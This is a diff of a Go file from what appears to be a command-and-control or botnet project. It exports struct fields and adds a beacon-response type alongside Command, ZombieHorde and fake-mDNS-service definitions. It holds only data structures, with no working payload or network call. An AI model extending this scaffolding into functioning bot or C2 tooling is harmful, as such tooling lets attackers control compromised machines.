@@ -5,9 +5,13 @@ each concept has its own faucets, traits, and actions
 
 Resources:
 	- https://gobyexample.com/structs
+
+Go Tips:
+	Field Names seem to require capitalization
+
 /*/
 
-package shared_code
+package Core
 
 import (
 	"crypto/cipher"
@@ -27,11 +31,11 @@ import (
 type Command struct {
 	Task_id int
 	//store as raw message for now, want to do everything procedurally
-	json_input      json.RawMessage
-	command_string  string
-	info_message    string
-	success_message string
-	failure_message string
+	Json_input      json.RawMessage
+	Command_string  string
+	Info_message    string
+	Success_message string
+	Failure_message string
 }
 
 // container for Commands
@@ -56,6 +60,12 @@ Contents of message are as follows:
 			}
 
 /*/
+
+// Initial Reply to Beacon from Command Center
+type BeaconResponse struct {
+	Authstring string
+}
+
 // Container for Outgoing messages to the Command And Control
 type OutgoingMessage struct {
 	// we can declare traits as any type we want
@@ -109,7 +119,7 @@ type ZombieHorde struct {
 
 // a "thing" to represent a fallacious MDNS service
 type FakeMDNSService struct {
-	host    string
-	info    string
-	service mdns.MDNSService
+	Host    string
+	Info    string
+	Service mdns.MDNSService
 }
